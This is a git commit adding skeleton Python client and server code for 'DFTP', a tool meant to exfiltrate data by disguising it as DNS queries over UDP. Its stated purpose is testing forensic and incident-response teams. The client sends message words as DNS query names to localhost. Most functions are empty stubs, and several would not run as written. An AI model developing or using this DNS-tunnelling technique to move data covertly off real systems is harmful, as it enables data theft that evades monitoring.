91023e4cbcf04afdb7c98f85493947fe003cc3ac
bigsnarfdude <ohprecio@gmail.com>
2012-11-28 12:04:26 -0500

    strawman of client and server

--- client_DFTP.py
+++ client_DFTP.py
@@ -3,8 +3,72 @@
 This progam is the client portion of DFTP and it exfiltrates data from a host to a DFTP server that looks and acts like a DNS server. Packets are UDP and look like DNS packets except for payload. This program is built to test DFIR response teams and DFIR tools.
 '''
 
+from scapy.all import *
+import time
+
+secret_message = "This is the secret message. I love DFTP."
+HOST = "" # ???
+PORT = "" #???
+DNS_SERVER = "127.0.0.1"
+DNS_SERVER_PORT = 8888
+
 class Client:
     def __init__():
         pass
+
+    def scan_DNS(address, port): 
+        s = socket.socket() 
+        print "Attempting to connect to %s on port %s." %(address, port) 
+        try: 
+            s.connect((address, port)) 
+            print "Connected to server %s on port %s." %(address, port) 
+            return True 
+        except socket.error, msg: 
+            print "Connecting to %s on port %s failed with the following error: %s" %(address, port, msg) 
+            return False
+
+    def check_DNS():
+        print host, socket.gethostbyname(host)
+        ip_address = socket.gethostbyname(host)
+        print ip_address
+        ip_list.append(ip_address)
+
+    def round_robin_DNS():
+        pass # use round robin service to fan out messages across 3 services?
+
+    def message_identifier():
+        pass
+
+    def message_encryption():
+        pass
+
+    def send_DNS(data):
+        print data
+        sr1(IP(dst="localhost")/UDP()/DNS(rd=1,qd=DNSQR(qname=data)))
+
+    def message_creator_text(data):
+        data = data.split()
+        for message in data:
+            send_DNS(message)
+            time.sleep(1)
+
+    def message_creator_picture(data):
+        pass
+
+    def message_creator_music(data):
+        pass
+
+    def message_creator_file(data):
+        pass
+
+    def message_creator_pdf(data):
+        pass
+
+    def message_creator_excel(data):
+        pass
+
+    def message_creator_doc(data):
+        pass
+
 
 
--- server_DFTP.py
+++ server_DFTP.py
@@ -3,6 +3,57 @@
 This progam is the server portion of DFTP and it is the destination and storage of the exfiltrated data from a host using the DFTP client progam. The server looks and acts like a DNS server. Packets are UDP and look like DNS packets except for payload. This program is built to test DFIR response teams and DFIR tools.
 '''
 
+import socket
+HOST = ""
+PORT = 53
+
+
 class Server:
     def __init__():
         pass
+
+    def start(HOST, PORT):
+        udp_service = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp_service.bind((HOST, PORT))
+
+    def buffer():
+        data, addr = udp_service.recvfrom(1024)
+
+    def decode_message_identifier(data):
+        pass
+
+    def decrypt_message_payload(data):
+        pass
+
+    def store_decrypted_ojbect(data):
+        pass
+
+    def message_text_reassembler(data):
+        text_message.append(data)
+        print "Data %s added to text_message" % data
+    
+    def get_message_text():
+        print "Here is the exfiltrated data so far"
+        time.sleep(1)
+        print text_message
+
+    def message_picture_reassembler(data):
+        pass
+
+    def message_music_reassembler(data):
+        pass
+
+    def message_file_reassembler(data):
+        pass
+
+    def message_pdf_reassembler(data):
+        pass
+
+    def message_excel_reassembler(data):
+        pass
+
+    def message_doc_reassembler(data):
+        pass
+
+
+
